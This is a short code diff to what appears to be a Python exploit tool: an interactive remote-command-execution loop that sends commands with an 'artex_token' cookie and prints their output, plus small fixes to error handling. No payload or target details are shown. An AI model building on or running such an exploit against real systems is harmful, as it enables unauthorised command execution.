@@ -144,7 +144,7 @@ def interative(token: str, target: str, timeout: int):
                 cookies={"artex_token": token},
                 timeout=timeout
             )
-            rce_json = rce.json()
+            rce_json : dict = rce.json()
             output = rce_json.get("output", "")
             is_error = rce_json.get("is_error", True)
             if rce.status_code == 401:
@@ -157,7 +157,7 @@ def interative(token: str, target: str, timeout: int):
             else:
                 print(f"[-] Unknown error: {rce.status_code}")
 
-            if is_error == True and hasattr(rce_json, "is_error"):
+            if is_error == True and rce_json.get("is_error", "") != "":
                 print(f"[-] Error: {output}")
 
             if output != "":
@@ -258,6 +258,10 @@ def main(args):
         print("\n\n[*] Shutdown requested.")
         MONITOR_STOP.set()
         pool.shutdown(wait=False, cancel_futures=True)
+
+    except Exception as e:
+        print(f"[-] Exploit failed: {e}")
+        return
 
     finally:
         pool.shutdown(wait=False, cancel_futures=True)
